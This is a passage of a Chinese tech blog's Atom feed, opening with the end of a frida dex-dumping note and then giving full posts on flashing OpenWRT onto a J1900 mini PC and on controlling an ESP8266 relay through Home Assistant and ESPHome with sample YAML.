<code>-d</code> 即深度搜索，结果更加完整，注意 <code>-f</code> 后必须直接跟包名</li></ol><h2 id="修复和查看"><a href="#修复和查看">修复和查看</a></h2><ol><li>生成的项目文件存放在<code>C:\\Windows\\System32</code>目录下  </li><li>使用 MT 管理器进行 dex 修复  </li><li>使用 jadx 查看修复后的 dex 文件  </li></ol>]]>
    </content>
    <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
    <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
  </entry>
  <entry>
    <title type="html"><![CDATA[ 为 J1900 小主机刷写 openWRT]]></title>
    <link href="https://az0x01-blog.vercel.app/20230305" />
    <id>https://az0x01-blog.vercel.app/20230305</id>
    <published>2023-03-05T00:00:00.000Z</published>
    <updated>2023-03-18T00:00:00.000Z</updated>
    <summary type="html"><![CDATA[尽管并不稳定，但折腾就对了]]></summary>
    <content type="html">
      <![CDATA[<h2 id="刷写"><a href="#刷写">刷写</a></h2><ol><li>准备 PE 盘：复制准备好的 openwrt 镜像 (x86-64)，（为了方便这里选择了整合包）和刷写工具 <a href="https://m0n0.ch/wall/physdiskwrite.php" rel="nofollow noopener noreferrer external" target="_blank">physdiskwrite</a> 到 PE 盘  </li><li>刷写镜像：在 bios 修改启动项，进入 PE，将原磁盘格式化为一个分区，使用 <code>physdiskwrite</code> 命令刷写，在 cmd 中输入命令 <code>.\physdiskwriter.exe -u &lt;镜像路径&gt;</code> 进行刷写</li><li>启动：修改回原来的启动项再启动，就可以进入 <code>openWRT</code></li></ol><h2 id="其他"><a href="#其他">其他</a></h2><ul><li>整合包中自带了 <code>openclash</code> ，导入配置即可使用，如果安装 <code>docker</code>，则需要使用 <code>TUN模式</code></li><li>在 BIOS 中设置通电自启是必要的  </li><li>在使用工具刷写时，需要选择要刷写的盘，请确定<code>0</code>和<code>1</code>中哪个才是硬盘，确定不了就多试几次吧 (悲)  </li><li>下载下来的镜像可能需要多次解压，需要的是分为<code>0.img ...</code>的上一级  </li><li>进入 PE 的方法请自行百度，台式机大多为开机时按 ESC 在 <code>BIOS</code> 中的 <code>BOOT</code> 选项中更改启动项，将 PE 盘放在第一位，保存并重启  </li><li>openWRT 初次启动后请设置账户密码  </li><li>服务长时间不重新启动可能会造成网速过慢</li></ul>]]>
    </content>
    <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  </entry>
  <entry>
    <title type="html"><![CDATA[通过 Homeassistant 控制继电器]]></title>
    <link href="https://az0x01-blog.vercel.app/20230113" />
    <id>https://az0x01-blog.vercel.app/20230113</id>
    <published>2023-01-13T00:00:00.000Z</published>
    <updated>2023-02-27T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="环境安装"><a href="#环境安装">环境安装</a></h2><ol><li>使用<a href="https://github.com/AlexxIT/HassWP" rel="nofollow noopener noreferrer external" target="_blank">HassWP</a>作为 homeassistant 客户端。</li><li>使用 ESPHome 作为连接 ESP8266 与 HA 的平台，由于 HassWP 并不是 HA 的完全体，所以这里需要安装完整的 ESPHome，这里选择将其部署在 Liunx 虚拟机上。</li><li>在安装 ESPHome 前请确保 Liunx 的 python 处于较高版本，这里使用了 3.11.1 版本。</li><li>使用 <code>pip3 install esphome</code> 命令安装 ESPHome;使用 <code>ln -s /home/coolcall/.local/bin/esphome /usr/local/bin/esphome</code> 创建<del>软连接</del> ；使用 <code>sudo esphome dashboard config/</code> 运行。</li></ol><h2 id="esp8266-接入-esphome"><a href="#esp8266-接入-esphome">ESP8266 接入 ESPHome</a></h2><ol><li>在 ESPHome 的管理页面中（建议在 windows 系统下使用 Liunx IP 地址的 6052 端口号访问，虚拟机使用桥接模式），点击<code>NEW DEVICE</code> 添加新设备，输入<code>name</code> ，在选择<code>ESP8266</code> 并出现<code>Configuration created!</code>后，先选择<code>SKIP</code>，然后在页面右上角的<code>SECRETS</code>处配置网络并保存。</li><li>完成后打开<code>EDIT</code>并进行<code>INSTALL</code>，选择第四个，这里我选择使用 ESP8266Flasher 刷写下载的<code>.bin</code>（需要安装 CH341 驱动），当然你也可以选择使用 ESPHome 提供的 web 页面进行刷写。这里需要下载编译链，请保持良好的网络环境并等待一段时间。</li><li>刷写成功后，ESP8266 就可以连接到 ESPHome 了，页面将会显示固件上线，再次点击<code>EDIT</code>，在<code>captive_portal:</code>后添加以下代码：</li></ol><!-- HTML_TAG_START --><pre class="shiki material-default" yaml="true"><div class="language-id">yaml</div><div class='code-container'><code><div class='line'>web_server:</div><div class='line'>  port: 80</div><div class='line'></div><div class='line'>switch:</div><div class='line'>  - platform: gpio</div><div class='line'>    pin: GPIO0</div><div class='line'>    name: "书房灯"</div><div class='line'>    id: relay2</div><div class='line'>    inverted: True</div><div class='line'>    </div><div class='line'>binary_sensor:</div><div class='line'>  - platform: gpio</div><div class='line'>    pin: GPIO2</div><div class='line'>    name: "press_switch_lib1"</div><div class='line'>    device_class: opening</div><div class='line'>    filters:</div><div class='line'>      - delayed_on_off: 100ms #消抖</div><div class='line'>    on_state:  #当这个二进制传感器状态改变的时候，触发 gpio0</div><div class='line'>      then:</div><div class='line'>        - switch.toggle: relay2</div></code></div></pre><!-- HTML_TAG_END --><p>再次<code>INSTALL</code>时即可选择第一个选项刷写。</p><h2 id="在-ha-中添加固件"><a href="#在-ha-中添加固件">在 HA 中添加固件</a></h2><ol><li>在 HA 的配置面板中选择设备与服务，在添加集成中搜索 ESPHome，主机地址需要填写上文中的<code>NAME</code>，在输入 key 后即可添加成功。（key 可以在刷写的<code>.yaml</code>文件中找到）</li></ol><h2 id="其他"><a href="#其他">其他</a></h2><p>WIFI 省电模式：</p><!-- HTML_TAG_START --><pre class="shiki material-default" yaml="true"><div class="language-id">yaml</div><div class='code-container'><code><div class='line'>wifi:</div><div class='line'>  # ...</div><div class='line'>power_save_mode: light</div></code></div></pre><!-- HTML_TAG_END -->]]>
    </content>
    <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  </entry>
</feed>